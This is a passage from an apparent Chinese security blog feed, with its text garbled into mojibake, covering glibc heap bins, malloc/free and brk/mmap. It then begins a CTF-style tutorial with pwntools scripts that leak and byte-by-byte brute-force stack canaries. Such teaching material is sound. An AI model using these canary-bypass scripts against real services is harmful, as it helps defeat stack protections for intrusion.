†å—æ‹¿æ¥å…ˆè¿›è¡Œå†…å­˜åˆ†é…</strong><br>å¦‚ä¸Šå›¾ï¼Œå¦‚æœç¨‹åºé‡æ–°è¯·æ±‚å’Œä¸Šé¢çš„å †å—å¤§å°ä¸€æ ·æ—¶å€™ï¼ˆmalloc)ï¼Œå †ç®¡ç†å™¨å°±ä¼šç›´æ¥ä½¿ç”¨ fast bin é‡Œçš„å †å—ã€‚<br><strong>è¿™é‡Œçš„è¯ä¹Ÿå°±æ˜¯ç›´æ¥ä½¿ç”¨ç¬¬äºŒæ¬¡é‡Šæ”¾çš„è¿™ä¸ªå †å—ï¼Œç„¶åå°†è¿™ä¸ªå †å—ä»é“¾è¡¨ä¸­ç§»é™¤ï¼Œæ¥ç€æ ¹æ®å †å—çš„ fk æŒ‡é’ˆæ‰¾åˆ°è¿™ä¸ªå †å—</strong>ï¼Œæ­¤æ—¶ main_arena å°±æŒ‡å‘äº†è¿™é‡Œã€‚ä¹Ÿå°±æ˜¯æ¢å¤åˆ°äº†ä¸Šé¢ç¬¬ä¸€ä¸ªå›¾ä¸­çš„æƒ…å†µã€‚</p><h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><p>é¡¾åæ€ä¹‰ï¼Œè¿™ä¸ªæ˜¯ä¸€ä¸ª small chunk ï¼Œæ»¡è¶³çš„å†…å­˜ç©ºé—´æ¯” fast bin å¤§ä¸€ç‚¹ã€‚<br>å¦‚æœç¨‹åºè¯·æ±‚çš„å†…å­˜èŒƒå›´ä¸åœ¨ fast bin çš„èŒƒå›´å†…ï¼Œå°±ä¼šè€ƒè™‘small binã€‚ç®€å•ç‚¹è¯´å°±æ˜¯å¤§äº 80 Bytes å°äºæŸä¸€ä¸ªå€¼æ—¶ï¼Œå°±ä¼šé€‰æ‹©ä»–ã€‚<br><strong>æè¿°ï¼š</strong></p><ol><li>åœ¨32ä½æ“ä½œç³»ç»Ÿä¸­ï¼Œå½“ç”¨æˆ·é‡Šæ”¾çš„å †å—å¤§å°<strong>å¤§äº64Bï¼Œå°äºç­‰äº512B</strong>æ—¶ä½¿ç”¨small binè¿›è¡Œç®¡ç†</li><li>small bin ä¸ºåŒå‘å¾ªç¯é“¾è¡¨ï¼Œä¸”ä½¿ç”¨ <strong>FIFO</strong>(First in, first out, å…ˆå…¥å…ˆå‡º)ç®—æ³•</li><li>å½“æ»¡è¶³small binæ¡ä»¶çš„chunkè¢«é‡Šæ”¾åï¼Œä¼šä¼˜å…ˆè¢«æ”¾å…¥unosrted binï¼Œåªæœ‰åœ¨ä¸€å®šæƒ…å†µä¸‹ï¼Œæ‰ä¼šè¢«åˆ†é…åˆ°small binä¸­</li><li>ç›¸é‚»çš„free chunkå°†ä¼šè¢«åˆå¹¶æˆä¸€ä¸ªæ›´å¤§çš„fee chunkï¼Œå¢åŠ å†…å­˜åˆ©ç”¨ç‡<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226204717.png" alt="Pasted image 20250226204717"><h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><blockquote><ol><li>å½“é‡Šæ”¾è¾ƒå°æˆ–è¾ƒå¤§çš„chunkçš„æ—¶å€™ï¼Œä¸ºäº†å¢åŠ åˆ†é…æ•ˆç‡ï¼Œç³»ç»Ÿä¼šå…ˆå°†æœ€è¿‘é‡Šæ”¾çš„chunkæ·»åŠ åˆ°unsorted binä¸­</li><li>unsorted bin ä¸ºä¸€ä¸ªåŒå‘å¾ªç¯é“¾è¡¨ï¼Œå¯¹chunkçš„å¤§å°æ²¡æœ‰é™åˆ¶ï¼Œå³ä»»ä½•å¤§å°çš„chunkéƒ½å¯ä»¥æ”¾å…¥unsorted biné“¾è¡¨ä¸­</li><li>å½“ fast binã€small bin ä¸­çš„ chunk éƒ½ä¸èƒ½æ»¡è¶³ç”¨æˆ·è¯·æ±‚ chunk å¤§å°æ—¶ï¼Œå †ç®¡ç†å™¨å°±ä¼šè€ƒè™‘ä½¿ç”¨ unsorted bin ã€‚å®ƒä¼šåœ¨åˆ†é… large chunk ä¹‹å‰å¯¹å †ä¸­ç¢ç‰‡ chunk è¿›è¡Œåˆå¹¶ï¼Œä»¥ä¾¿å‡å°‘å †ä¸­çš„ç¢ç‰‡ã€‚</li></ol></blockquote></li></ol><ul><li>unsorted bin ä¸ fast bin ä¸åŒï¼Œä»–ä½¿ç”¨<strong>åŒå‘é“¾è¡¨</strong>å¯¹ chunk è¿›è¡Œè¿æ¥</li><li>unsorted çš„å­—é¢æ„æ€å°±æ˜¯â€ä¸å¯å›æ”¶â€çš„æ„æ€ï¼Œå¯ä»¥çœ‹ä½œå°†ä¸å¯å›æ”¶çš„åƒåœ¾ï¼ˆä¸æ»¡è¶³èƒ½å¤Ÿè¿›è¡Œå†…å­˜åˆ†é…çš„å †å—ï¼‰éƒ½æ”¾åˆ°è¿™ä¸ªâ€åƒåœ¾æ¡¶â€ä¸­ã€‚</li></ul><h2 id="æ·±å…¥ç†è§£å †çš„æ¦‚å¿µ"><a href="#æ·±å…¥ç†è§£å †çš„æ¦‚å¿µ" class="headerlink" title="æ·±å…¥ç†è§£å †çš„æ¦‚å¿µ"></a>æ·±å…¥ç†è§£å †çš„æ¦‚å¿µ</h2><p>åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå †å¯ä»¥æä¾›åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼Œå…è®¸ç¨‹åºç”³è¯·å¤§å°æœªçŸ¥çš„å†…å­˜ã€‚<strong>å †å…¶å®å°±æ˜¯ç¨‹åºè™šæ‹Ÿåœ°å€ç©ºé—´çš„ä¸€å—è¿ç»­çš„çº¿æ€§åŒºåŸŸï¼Œå®ƒç”±ä½åœ°å€å‘é«˜åœ°å€æ–¹å‘å¢é•¿</strong>ã€‚æˆ‘ä»¬ä¸€èˆ¬ç§°ç®¡ç†å †çš„é‚£éƒ¨åˆ†ç¨‹åºä¸ºå †ç®¡ç†å™¨ã€‚<br><strong>å †ç®¡ç†å™¨å¤„äºç”¨æˆ·ç¨‹åºä¸å†…æ ¸ä¸­é—´</strong>ï¼Œä¸»è¦åšä»¥ä¸‹å·¥ä½œï¼š  </p><ol><li>å“åº”ç”¨æˆ·çš„ç”³è¯·å†…å­˜è¯·æ±‚ï¼Œå‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜ï¼Œç„¶åå°†å…¶è¿”å›ç»™ç”¨æˆ·ç¨‹åºã€‚åŒæ—¶ï¼Œ<em>ä¸ºäº†ä¿æŒå†…å­˜ç®¡ç†çš„é«˜æ•ˆæ€§ï¼Œå†…æ ¸ä¸€èˆ¬éƒ½ä¼šé¢„å…ˆåˆ†é…å¾ˆå¤§çš„ä¸€å—è¿ç»­çš„å†…å­˜ï¼Œç„¶åè®©å †ç®¡ç†å™¨é€šè¿‡æŸç§ç®—æ³•ç®¡ç†è¿™å—å†…å­˜ã€‚åªæœ‰å½“å‡ºç°äº†å †ç©ºé—´ä¸è¶³çš„æƒ…å†µï¼Œå †ç®¡ç†å™¨æ‰ä¼šå†æ¬¡ä¸æ“ä½œç³»ç»Ÿè¿›è¡Œäº¤äº’</em>ã€‚  </li><li>ç®¡ç†ç”¨æˆ·æ‰€é‡Šæ”¾çš„å†…å­˜ã€‚<em>ä¸€èˆ¬æ¥è¯´ï¼Œç”¨æˆ·é‡Šæ”¾çš„å†…å­˜å¹¶ä¸æ˜¯ç›´æ¥è¿”è¿˜ç»™æ“ä½œç³»ç»Ÿçš„ï¼Œè€Œæ˜¯ç”±å †ç®¡ç†å™¨è¿›è¡Œç®¡ç†ã€‚è¿™äº›é‡Šæ”¾çš„å†…å­˜å¯ä»¥æ¥å“åº”ç”¨æˆ·æ–°ç”³è¯·çš„å†…å­˜çš„è¯·æ±‚</em>ã€‚<br>Linux ä¸­æ—©æœŸçš„å †åˆ†é…ä¸å›æ”¶ç”± Doug Lea å®ç°ï¼Œä½†å®ƒåœ¨å¹¶è¡Œå¤„ç†å¤šä¸ªçº¿ç¨‹æ—¶ï¼Œä¼šå…±äº«è¿›ç¨‹çš„å †å†…å­˜ç©ºé—´ã€‚å› æ­¤ï¼Œä¸ºäº†å®‰å…¨æ€§ï¼Œä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨å †æ—¶ï¼Œä¼šè¿›è¡ŒåŠ é”ã€‚ç„¶è€Œï¼Œä¸æ­¤åŒæ—¶ï¼ŒåŠ é”ä¼šå¯¼è‡´å…¶å®ƒçº¿ç¨‹æ— æ³•ä½¿ç”¨å †ï¼Œé™ä½äº†å†…å­˜åˆ†é…å’Œå›æ”¶çš„é«˜æ•ˆæ€§ã€‚åŒæ—¶ï¼Œå¦‚æœåœ¨å¤šçº¿ç¨‹ä½¿ç”¨æ—¶ï¼Œæ²¡èƒ½æ­£ç¡®æ§åˆ¶ï¼Œä¹Ÿå¯èƒ½å¼•èµ·å†…å­˜åˆ†é…å’Œå›æ”¶çš„æ­£ç¡®æ€§ã€‚Wolfram Gloger åœ¨ Doug Lea çš„åŸºç¡€ä¸Šè¿›è¡Œæ”¹è¿›ä½¿å…¶å¯ä»¥æ”¯æŒå¤šçº¿ç¨‹ï¼Œè¿™ä¸ªå †åˆ†é…å™¨å°±æ˜¯ ptmalloc ã€‚åœ¨ glibc-2.3.x. ä¹‹åï¼Œglibc ä¸­é›†æˆäº†ptmalloc2ã€‚<br>ç›®å‰ Linux æ ‡å‡†å‘è¡Œç‰ˆä¸­ä½¿ç”¨çš„å †åˆ†é…å™¨æ˜¯ glibc ä¸­çš„å †åˆ†é…å™¨ï¼šptmalloc2ã€‚<strong>ptmalloc2 ä¸»è¦æ˜¯é€šè¿‡ malloc/free å‡½æ•°æ¥åˆ†é…å’Œé‡Šæ”¾å†…å­˜å—ã€‚</strong><br>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨å†…å­˜åˆ†é…ä¸ä½¿ç”¨çš„è¿‡ç¨‹ä¸­ï¼ŒLinuxæœ‰è¿™æ ·çš„ä¸€ä¸ªåŸºæœ¬å†…å­˜ç®¡ç†æ€æƒ³ï¼Œ<strong>åªæœ‰å½“çœŸæ­£è®¿é—®ä¸€ä¸ªåœ°å€çš„æ—¶å€™ï¼Œç³»ç»Ÿæ‰ä¼šå»ºç«‹è™šæ‹Ÿé¡µé¢ä¸ç‰©ç†é¡µé¢çš„æ˜ å°„å…³ç³»ã€‚ æ‰€ä»¥è™½ç„¶æ“ä½œç³»ç»Ÿå·²ç»ç»™ç¨‹åºåˆ†é…äº†å¾ˆå¤§çš„ä¸€å—å†…å­˜ï¼Œä½†æ˜¯è¿™å—å†…å­˜å…¶å®åªæ˜¯è™šæ‹Ÿå†…å­˜ã€‚åªæœ‰å½“ç”¨æˆ·ä½¿ç”¨åˆ°ç›¸åº”çš„å†…å­˜æ—¶ï¼Œç³»ç»Ÿæ‰ä¼šçœŸæ­£åˆ†é…ç‰©ç†é¡µé¢ç»™ç”¨æˆ·ä½¿ç”¨ã€‚</strong></li></ol><h2 id="å †çš„åŸºæœ¬æ“ä½œ"><a href="#å †çš„åŸºæœ¬æ“ä½œ" class="headerlink" title="å †çš„åŸºæœ¬æ“ä½œ"></a>å †çš„åŸºæœ¬æ“ä½œ</h2><p>è¿™é‡Œæˆ‘ä»¬ä¸»è¦ä»‹ç»  </p><ul><li>åŸºæœ¬çš„å †æ“ä½œï¼ŒåŒ…æ‹¬å †çš„åˆ†é…ï¼Œå›æ”¶ï¼Œå †åˆ†é…èƒŒåçš„ç³»ç»Ÿè°ƒç”¨  </li><li>ä»‹ç»å †ç›®å‰çš„å¤šçº¿ç¨‹æ”¯æŒã€‚  <h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3>åœ¨ glibc çš„<a href="https://github.com/iromise/glibc/blob/master/malloc/malloc.c#L448">malloc.h</a>ä¸­ï¼Œmalloc çš„è¯´æ˜å¦‚ä¸‹ï¼š  <pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;*  malloc(size_t n)  Returns a pointer to a newly allocated chunk of at least n bytes, or null  if no space is available. Additionally, on failure, errno is  set to ENOMEM on ANSI C systems.  If n is zero, malloc returns a minumum-sized chunk. (The minimum  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit  systems.)  On most systems, size_t is an unsigned type, so calls  with negative arguments are interpreted as requests for huge amounts  of space, which will often fail. The maximum supported value of n  differs across systems, but is in all cases less than the maximum  representable value of a size_t.*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>å¯ä»¥çœ‹å‡ºï¼Œmalloc å‡½æ•°è¿”å›å¯¹åº”å¤§å°å­—èŠ‚çš„å†…å­˜å—çš„æŒ‡é’ˆã€‚æ­¤å¤–ï¼Œè¯¥å‡½æ•°è¿˜å¯¹ä¸€äº›å¼‚å¸¸æƒ…å†µè¿›è¡Œäº†å¤„ç†  </li><li>å½“ n=0 æ—¶ï¼Œ<strong>è¿”å›å½“å‰ç³»ç»Ÿå…è®¸çš„å †çš„æœ€å°å†…å­˜å—</strong>ã€‚  </li><li>å½“ n ä¸ºè´Ÿæ•°æ—¶ï¼Œç”±äºåœ¨å¤§å¤šæ•°ç³»ç»Ÿä¸Šï¼Œ<strong>size_t æ˜¯æ— ç¬¦å·æ•°ï¼ˆè¿™ä¸€ç‚¹éå¸¸é‡è¦ï¼‰</strong>ï¼Œæ‰€ä»¥ç¨‹åºå°±ä¼šç”³è¯·å¾ˆå¤§çš„å†…å­˜ç©ºé—´ï¼Œä½†é€šå¸¸æ¥è¯´éƒ½ä¼šå¤±è´¥ï¼Œå› ä¸ºç³»ç»Ÿæ²¡æœ‰é‚£ä¹ˆå¤šçš„å†…å­˜å¯ä»¥åˆ†é…ã€‚  <h3 id="free-1"><a href="#free-1" class="headerlink" title="free"></a>free</h3>åœ¨ glibc çš„ <a href="https://github.com/iromise/glibc/blob/master/malloc/malloc.c#L465">malloc.h</a> ä¸­ï¼Œfree çš„è¯´æ˜å¦‚ä¸‹  <pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;*  free(void* p)  Releases the chunk of memory pointed to by p, that had been previously  allocated using malloc or a related routine such as realloc.  It has no effect if p is null. It can have arbitrary (i.e., bad!)  effects if p has already been freed.  Unless disabled (using mallopt), freeing very large spaces will  when possible, automatically trigger operations that give  back unused memory to the system, thus reducing program footprint.*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>å¯ä»¥çœ‹å‡ºï¼Œfree å‡½æ•°ä¼šé‡Šæ”¾ç”± p æ‰€æŒ‡å‘çš„å†…å­˜å—ã€‚<strong>è¿™ä¸ªå†…å­˜å—æœ‰å¯èƒ½æ˜¯é€šè¿‡ malloc å‡½æ•°å¾—åˆ°çš„ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯é€šè¿‡ç›¸å…³çš„å‡½æ•° realloc å¾—åˆ°çš„ã€‚</strong><br>æ­¤å¤–ï¼Œè¯¥å‡½æ•°ä¹ŸåŒæ ·å¯¹å¼‚å¸¸æƒ…å†µè¿›è¡Œäº†å¤„ç†  </li><li><strong>å½“ p ä¸ºç©ºæŒ‡é’ˆæ—¶ï¼Œå‡½æ•°ä¸æ‰§è¡Œä»»ä½•æ“ä½œ</strong>ã€‚  </li><li>å½“ p å·²ç»è¢«é‡Šæ”¾ä¹‹åï¼Œ<strong>å†æ¬¡é‡Šæ”¾ä¼šå‡ºç°ä¹±ä¸ƒå…«ç³Ÿçš„æ•ˆæœ</strong>ï¼Œè¿™å…¶å®å°±æ˜¯ <code>double free</code>ã€‚  </li><li><strong>é™¤äº†è¢«ç¦ç”¨ (mallopt) çš„æƒ…å†µä¸‹ï¼Œå½“é‡Šæ”¾å¾ˆå¤§çš„å†…å­˜ç©ºé—´æ—¶ï¼Œç¨‹åºä¼šå°†è¿™äº›å†…å­˜ç©ºé—´è¿˜ç»™ç³»ç»Ÿï¼Œä»¥ä¾¿äºå‡å°ç¨‹åºæ‰€ä½¿ç”¨çš„å†…å­˜ç©ºé—´</strong>ã€‚  </li></ul><h2 id="å†…å­˜åˆ†é…èƒŒåçš„ç³»ç»Ÿè°ƒç”¨"><a href="#å†…å­˜åˆ†é…èƒŒåçš„ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="å†…å­˜åˆ†é…èƒŒåçš„ç³»ç»Ÿè°ƒç”¨"></a>å†…å­˜åˆ†é…èƒŒåçš„ç³»ç»Ÿè°ƒç”¨</h2><p>åœ¨å‰é¢æåˆ°çš„å‡½æ•°ä¸­ï¼Œæ— è®ºæ˜¯ malloc å‡½æ•°è¿˜æ˜¯ free å‡½æ•°ï¼Œæˆ‘ä»¬åŠ¨æ€ç”³è¯·å’Œé‡Šæ”¾å†…å­˜æ—¶ï¼Œéƒ½ç»å¸¸ä¼šä½¿ç”¨ï¼Œä½†æ˜¯å®ƒä»¬å¹¶ä¸æ˜¯çœŸæ­£ä¸ç³»ç»Ÿäº¤äº’çš„å‡½æ•°ã€‚è¿™äº›å‡½æ•°èƒŒåçš„ç³»ç»Ÿè°ƒç”¨ä¸»è¦æ˜¯ <a href="http://man7.org/linux/man-pages/man2/sbrk.2.html">(s)brk</a> å‡½æ•°ä»¥åŠ <a href="http://man7.org/linux/man-pages/man2/mmap.2.html">mmap, munmap</a> å‡½æ•°ã€‚<br>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬ä¸»è¦è€ƒè™‘å¯¹å †è¿›è¡Œç”³è¯·å†…å­˜å—çš„æ“ä½œã€‚</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599128488052-ad18a93d-0e6f-4713-b517-c672eed6cd56.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_14%2Ctext_Q3liZXJhbmdlbA%3D%3D%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10%2Fformat%2Cwebp%2Fresize%2Cw_480%2Climit_0" alt></p><h3 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h3><p>å¯¹äºå †çš„æ“ä½œï¼Œæ“ä½œç³»ç»Ÿæä¾›äº† brk å‡½æ•°ï¼Œglibc åº“æä¾›äº† sbrk å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¢åŠ  <a href="http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365">brk</a><br>brk å’Œ sbrkçš„ä½œç”¨ï¼šmallocçš„åº•å±‚å®ç°ï¼Œç”¨äºåˆ†é…å¼€è¾Ÿå†…å­˜ï¼Œä½†æ˜¯brkæ˜¯ç³»ç»Ÿè°ƒç”¨ è€Œsbrkä¸æ˜¯  ï¼Œsbrkè°ƒç”¨äº†brk<br>(program break location, the program break is the address of the first location beyond the current end of the data region <a href="https://en.wikipedia.org/wiki/Sbrk\">https://en.wikipedia.org/wiki/Sbrk)çš„å¤§å°æ¥å‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜</a>%E7%9A%84%E5%A4%A7%E5%B0%8F%E6%9D%A5%E5%90%91%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%94%B3%E8%AF%B7%E5%86%85%E5%AD%98)ã€‚  </p><blockquote><p>å…³äºprogram break ï¼šç¨‹åºé—´æ–­ç‚¹</p></blockquote><p><strong>åˆå§‹æ—¶ï¼Œå †çš„èµ·å§‹åœ°å€ <a href="http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365">start_brk</a> ä»¥åŠå †çš„å½“å‰æœ«å°¾ <a href="http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365">brk</a> æŒ‡å‘åŒä¸€åœ°å€</strong>ã€‚æ ¹æ®æ˜¯å¦å¼€å¯ASLRï¼Œä¸¤è€…çš„å…·ä½“ä½ç½®ä¼šæœ‰æ‰€ä¸åŒ  </p><ul><li>ä¸å¼€å¯ ASLR ä¿æŠ¤æ—¶ï¼Œstart_brk ä»¥åŠ brk ä¼šæŒ‡å‘ data/bss æ®µçš„ç»“å°¾ã€‚  </li><li>å¼€å¯ ASLR ä¿æŠ¤æ—¶ï¼Œstart_brk ä»¥åŠ brk ä¹Ÿä¼šæŒ‡å‘åŒä¸€ä½ç½®ï¼Œåªæ˜¯è¿™ä¸ªä½ç½®æ˜¯åœ¨ data/bss æ®µç»“å°¾åçš„éšæœºåç§»å¤„ã€‚<br>å…·ä½“æ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤º<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599129188134-82bd81ed-579a-4c91-9d4f-5b95d0eb6fb4.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_23%2Ctext_Q3liZXJhbmdlbA%3D%3D%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10%2Fformat%2Cwebp%2Fresize%2Cw_819%2Climit_0" alt><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><strong>mallocä¼šä½¿ç”¨mmapæ¥åˆ›å»ºç‹¬ç«‹çš„åŒ¿åæ˜ å°„æ®µã€‚åŒ¿åæ˜ å°„çš„ç›®çš„ä¸»è¦æ˜¯å¯ä»¥ç”³è¯·ä»¥oå¡«å……çš„å†…å­˜ï¼Œå¹¶ä¸”è¿™å—å†…å­˜ä»…è¢«è°ƒç”¨è¿›ç¨‹æ‰€ä½¿ç”¨ã€‚</strong><br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226213113.png" alt="Pasted image 20250226213113"></li></ul><h4 id="åœ¨æ‰§è¡Œmmapä¹‹å‰"><a href="#åœ¨æ‰§è¡Œmmapä¹‹å‰" class="headerlink" title="åœ¨æ‰§è¡Œmmapä¹‹å‰"></a>åœ¨æ‰§è¡Œmmapä¹‹å‰</h4><p><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226213125.png" alt="Pasted image 20250226213125"></p><h4 id="mmapå"><a href="#mmapå" class="headerlink" title="mmapå"></a>mmapå</h4><p><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226213144.png" alt="Pasted image 20250226213144"></p><h4 id="munmap"><a href="#munmap" class="headerlink" title="munmap"></a>munmap</h4><p><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226213155.png" alt="Pasted image 20250226213155"></p><h3 id="å¤šçº¿ç¨‹æ”¯æŒ"><a href="#å¤šçº¿ç¨‹æ”¯æŒ" class="headerlink" title="å¤šçº¿ç¨‹æ”¯æŒ"></a>å¤šçº¿ç¨‹æ”¯æŒ</h3><p><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226213304.png" alt="Pasted image 20250226213304"><br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226213327.png" alt="Pasted image 20250226213327"><br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226213356.png" alt="Pasted image 20250226213356"><br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226213413.png" alt="Pasted image 20250226213413"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> å † </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNæŠ€å·§-ç»•è¿‡Canaryçš„å‡ ç§å§¿åŠ¿</title>
      <link href="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/"/>
      <url>/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="1-æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è·å–Canary"><a href="#1-æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è·å–Canary" class="headerlink" title="1. æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è·å–Canary"></a>1. æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è·å–Canary</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">pl1&#x3D;&#39;a&#39;*0x49p.sendafter(&#39;overflow?\n&#39;,pl1)data&#x3D;p.recv()canary&#x3D;b&#39;\x00&#39;+data[0x49:0x49+7]canary &#x3D; int.from_bytes(canary,&#39;little&#39;)success(&#39;canary:&#39;)success(hex(canary))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-è¦†ç›–æˆªæ–­å­—ç¬¦è·å–Canary"><a href="#2-è¦†ç›–æˆªæ–­å­—ç¬¦è·å–Canary" class="headerlink" title="2. è¦†ç›–æˆªæ–­å­—ç¬¦è·å–Canary"></a>2. è¦†ç›–æˆªæ–­å­—ç¬¦è·å–Canary</h2><h2 id="3-é€å­—èŠ‚çˆ†ç ´Canary"><a href="#3-é€å­—èŠ‚çˆ†ç ´Canary" class="headerlink" title="3. é€å­—èŠ‚çˆ†ç ´Canary"></a>3. é€å­—èŠ‚çˆ†ç ´Canary</h2><blockquote><p>é€‚ç”¨äºæœ‰é€šè¿‡fork()å‡½æ•°åˆ›å»ºçš„å­è¿›ç¨‹çš„ç¨‹åº</p><h3 id="çˆ†ç ´åŸç†"><a href="#çˆ†ç ´åŸç†" class="headerlink" title="çˆ†ç ´åŸç†"></a>çˆ†ç ´åŸç†</h3><ul><li>å¯¹äºCanaryï¼Œè™½ç„¶æ¯æ¬¡è¿›ç¨‹é‡å¯åCanaryä¸åŒï¼Œ<strong>ä½†æ˜¯åŒä¸€ä¸ªè¿›ç¨‹ä¸­çš„ä¸åŒçº¿ç¨‹çš„Cannaryæ˜¯ç›¸åŒçš„ï¼Œå¹¶ä¸”é€šè¿‡forkå‡½æ•°åˆ›å»ºçš„å­è¿›ç¨‹ä¸­çš„canaryä¹Ÿæ˜¯ç›¸åŒçš„ï¼Œå› ä¸ºforkå‡½æ•°ä¼šç›´æ¥æ‹·è´çˆ¶è¿›ç¨‹çš„å†…å­˜</strong>ã€‚</li><li>æœ€ä½ä½ä¸º0x00ï¼Œä¹‹åé€æ¬¡çˆ†ç ´ï¼Œå¦‚æœcanaryçˆ†ç ´ä¸æˆåŠŸï¼Œåˆ™ç¨‹åºå´©æºƒï¼›çˆ†ç ´æˆåŠŸåˆ™ç¨‹åºè¿›è¡Œä¸‹é¢çš„é€»è¾‘ã€‚ç”±æ­¤å¯åˆ¤æ–­çˆ†ç ´æ˜¯å¦æˆåŠŸã€‚</li><li>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™æ ·çš„ç‰¹ç‚¹ï¼Œå½»åº•é€ä¸ªå­—èŠ‚å°†Canaryçˆ†ç ´å‡ºæ¥ã€‚<h3 id="é€šç”¨æ¨¡æ¿"><a href="#é€šç”¨æ¨¡æ¿" class="headerlink" title="é€šç”¨æ¨¡æ¿"></a>é€šç”¨æ¨¡æ¿</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context.log_level &#x3D; &#39;debug&#39;context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;bash&#39;,&#39;-c&#39;]context(arch&#x3D;&#39;i386&#39;, os&#x3D;&#39;linux&#39;)local &#x3D; 1elf &#x3D; ELF(&#39;.&#x2F;bin1&#39;)if local:    p &#x3D; process(&#39;.&#x2F;bin1&#39;)    libc &#x3D; elf.libcelse:    p &#x3D; remote(&#39;&#39;)    libc &#x3D; ELF(&#39;.&#x2F;&#39;)p.recvuntil(b&#39;welcome\n&#39;)canary &#x3D; b&#39;\x00&#39;for k in range(3):  info(f&#39;-----No:&#123;k+1&#125; start,finding-----&#39;)  for i in range(256):     p.send(b&#39;a&#39;*(0x70-0xc)+canary+bytes([i]))     recv &#x3D; p.recvuntil(b&#39;welcome\n&#39;)     print(recv)     if b&quot;stack&quot; in recv:        continue     else:      canary +&#x3D; bytes([i])      success(f&quot;canary &#x3D;&gt; &#123;canary.hex()&#125;&quot;)      break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><a 